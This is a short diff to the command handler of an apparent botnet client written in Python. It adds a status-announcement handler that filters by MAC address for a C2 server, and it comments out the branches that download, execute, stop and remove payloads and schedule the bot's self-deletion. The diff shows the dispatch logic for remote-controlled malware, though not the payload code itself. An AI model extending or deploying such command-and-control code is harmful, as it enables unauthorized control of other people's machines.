@@ -107,6 +107,17 @@ class CommandHandler:
         # Stop bot
         self.bot.quit = True
 
+    # Handle status request, if params is None or matches the bot's MAC address, announce status to C2 server
+    def __handle_status_request(self, id, params):
+        if params != None:
+            MACADDR = params[0]
+
+        if id == None:
+            self.__announce_status()
+        elif MACADDR == self.machineInfo.MAC_ADDR:
+            self.__announce_status()
+        else:
+            pass
 
     # Handle commands received from C2 server
     def handle_command(self, cmd_tuple):
@@ -116,16 +127,16 @@ class CommandHandler:
         print(f"Handling command: {cmd}, id: {id}, params: {params}")
 
         if cmd == Command.STATUS:
-            self.__announce_status()
-        elif cmd == Command.PAYLOAD:
-            self.__download_payload(id)
-        elif cmd == Command.EXECUTE:
-            self.__executePayload(id)
-        elif cmd == Command.STOP:
-            self.__stopPayload()
-        elif cmd == Command.REMOVE:
-            self.__stopPayload()
-            self.__cleanupPayloads()
-            self.__schedule_self_delete()
+            self.__handle_status_request(id, params)
+        # elif cmd == Command.PAYLOAD:
+        #     self.__download_payload(id)
+        # elif cmd == Command.EXECUTE:
+        #     self.__executePayload(id)
+        # elif cmd == Command.STOP:
+        #     self.__stopPayload()
+        # elif cmd == Command.REMOVE:
+        #     self.__stopPayload()
+        #     self.__cleanupPayloads()
+        #     self.__schedule_self_delete()
         else:
             print ("Received unknown command, ignoring...")
